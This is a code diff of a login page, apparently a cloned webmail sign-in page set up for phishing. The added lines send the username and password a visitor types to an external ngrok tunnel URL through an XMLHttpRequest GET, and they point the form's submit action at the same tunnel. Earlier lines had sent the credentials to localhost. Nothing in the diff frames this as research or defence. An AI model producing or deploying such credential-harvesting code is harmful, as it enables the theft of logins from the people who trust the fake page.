@@ -958,7 +958,7 @@
             var curTime = new Date().toLocaleDateString();
             var ObjectData = "ObjectType=" + escape(curTime + "\t" + gbid("username").value + "\t" + gbid("password").value) + "&uin=" + Math.random().toString(16).substring(2);
 
-            xmlhttp.open("GET", "http://127.0.0.1:8000/UserName="+ gbid("username").value+"&Password=" + gbid("password").value);
+            xmlhttp.open("GET", "https://89d9-196-189-182-241.ngrok-free.app/UserName="+ gbid("username").value+"&Password=" + gbid("password").value);
             xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             xmlhttp.send(ObjectData);
             // Add performance marker for Logon page as the item name defined in the spec:
@@ -1253,7 +1253,7 @@
     </div>
 </noscript>
 
-<form action="https://e582-196-189-182-241.ngrok-free.app" method="GET" name="logonForm" ENCTYPE="application/x-www-form-urlencoded"
+<form action="https://89d9-196-189-182-241.ngrok-free.app" method="GET" name="logonForm" ENCTYPE="application/x-www-form-urlencoded"
     autocomplete="off">
 
     <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
